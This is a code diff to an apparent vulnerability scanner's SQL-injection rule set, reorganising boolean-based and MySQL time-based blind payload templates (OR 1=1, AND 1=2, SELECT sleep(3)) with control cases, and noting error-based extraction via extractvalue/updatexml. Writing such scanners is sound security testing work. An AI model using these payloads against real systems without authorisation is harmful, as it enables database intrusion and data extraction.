@@ -2,17 +2,23 @@ from __future__ import annotations
 
 _SLEEP = 3
 
-_BOOLEAN_AND_FALSE_TEMPLATES = [
-    "{value} AND 1=2 -- ",
-    "{value}' AND '1'='2' -- ",
-    '{value}" AND "1"="2" -- ',
-    "{value} AND 1=2",
-    "{value}' AND '1'='2",
-    '{value}" AND "1"="2"',
-    "{value}XYZABCDEFGHIJ",
-    "{value}XYZABCDEFGHIJ' -- ",
-    '{value}XYZABCDEFGHIJ" -- ',
+_TIME_TEMPLATES = [
+    "{value} / sleep({sleep}) ",
+    "{value}' / sleep({sleep}) / '",
+    '{value}" / sleep({sleep}) / "',
+    "{value} AND 0 IN (SELECT sleep({sleep}) ) -- ",
+    "{value}' AND 0 IN (SELECT sleep({sleep}) ) -- ",
+    '{value}" AND 0 IN (SELECT sleep({sleep}) ) -- ',
+    "{value} WHERE 0 IN (SELECT sleep({sleep}) ) -- ",
+    "{value}' WHERE 0 IN (SELECT sleep({sleep}) ) -- ",
+    '{value}" WHERE 0 IN (SELECT sleep({sleep}) ) -- ',
+    "{value} OR 0 IN (SELECT sleep({sleep}) ) -- ",
+    "{value}' OR 0 IN (SELECT sleep({sleep}) ) -- ",
+    '{value}" OR 0 IN (SELECT sleep({sleep}) ) -- ',
 ]
+_TIME_ATTACK_TEMPLATES = [t.replace("{sleep}", str(_SLEEP)) for t in _TIME_TEMPLATES]
+_TIME_CONTROL_TEMPLATES = [t.replace("{sleep}", "0") for t in _TIME_TEMPLATES]
+
 
 SQLI_RULES: list[dict] = [
     # error: 에러 기반 (DB 에러 메시지 노출로 판정)
@@ -35,7 +41,6 @@ SQLI_RULES: list[dict] = [
             ],
         },
     },
-    # UNION — 컬럼 수 불일치 에러로 판정
     {
         "attack_id": "PL-SQLI-ERROR-UNION",
         "vuln_type": "sqli",
@@ -53,7 +58,6 @@ SQLI_RULES: list[dict] = [
             ],
         },
     },
-    # ORDER BY <큰수> — Unknown column 에러로 판정
     {
         "attack_id": "PL-SQLI-ERROR-ORDERBY",
         "vuln_type": "sqli",
@@ -71,8 +75,8 @@ SQLI_RULES: list[dict] = [
             ],
         },
     },
-    # extractvalue/updatexml — 에러에 DB 정보 노출시켜 추출
     {
+        # extractvalue/updatexml로 값을 마커(~~)로 감싸 에러에 노출, substring 24로 32자 truncate 대응
         "attack_id": "PL-SQLI-ERROR-EXTRACT",
         "vuln_type": "sqli",
         "technique": "error_extract",
@@ -100,50 +104,57 @@ SQLI_RULES: list[dict] = [
         "vuln_type": "sqli",
         "technique": "boolean",
         "category": "boolean",
-        "sequence": ["baseline", "true_attack", "false_attack"],
+        "sequence": ["baseline", "and_true", "and_false", "or_true", "or_false", "control"],
+
         "payload_templates": {
-            "true_attack": [
+            "and_true": [
                 "{value} AND 1=1 -- ",
                 "{value}' AND '1'='1' -- ",
                 '{value}" AND "1"="1" -- ',
                 "{value} AND 1=1",
                 "{value}' AND '1'='1",
                 '{value}" AND "1"="1"',
+            ],
+            "and_false": [
+                "{value} AND 1=2 -- ",
+                "{value}' AND '1'='2' -- ",
+                '{value}" AND "1"="2" -- ',
+                "{value} AND 1=2",
+                "{value}' AND '1'='2",
+                '{value}" AND "1"="2"',
+            ],
+            "or_true": [
                 "{value} OR 1=1 -- ",
                 "{value}' OR '1'='1' -- ",
                 '{value}" OR "1"="1" -- ',
                 "{value} OR 1=1",
                 "{value}' OR '1'='1",
                 '{value}" OR "1"="1"',
-                "{value}%",
-                "{value}%' -- ",
-                '{value}%" -- ',
             ],
-            "false_attack": _BOOLEAN_AND_FALSE_TEMPLATES,
+            "or_false": [
+                "{value} OR 1=2 -- ",
+                "{value}' OR '1'='2' -- ",
+                '{value}" OR "1"="2" -- ',
+                "{value} OR 1=2",
+                "{value}' OR '1'='2",
+                '{value}" OR "1"="2"',
+            ],
+            "control": [
+                "{value}XYZABCDEFGHIJ",
+                "{value}XYZABCDEFGHIJ' -- ",
+                '{value}XYZABCDEFGHIJ" -- ',
+            ],
         },
     },
-    # time: 시간 기반 블라인드 (sleep 지연으로 판정)
     {
         "attack_id": "PL-SQLI-TIME-MYSQL",
         "vuln_type": "sqli",
         "technique": "time_mysql",
         "category": "time",
-        "sequence": ["baseline", "attack"],
+        "sequence": ["baseline", "attack", "control"],
         "payload_templates": {
-            "attack": [
-                f"{{value}} / sleep({_SLEEP}) ",
-                f"{{value}}' / sleep({_SLEEP}) / '",
-                f'{{value}}" / sleep({_SLEEP}) / "',
-                f"{{value}} AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
-                f"{{value}}' AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
-                f'{{value}}" AND 0 IN (SELECT sleep({_SLEEP}) ) -- ',
-                f"{{value}} WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
-                f"{{value}}' WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
-                f'{{value}}" WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ',
-                f"{{value}} OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
-                f"{{value}}' OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
-                f'{{value}}" OR 0 IN (SELECT sleep({_SLEEP}) ) -- ',
-            ],
+            "attack": _TIME_ATTACK_TEMPLATES,
+            "control": _TIME_CONTROL_TEMPLATES,
         },
     },
 ]
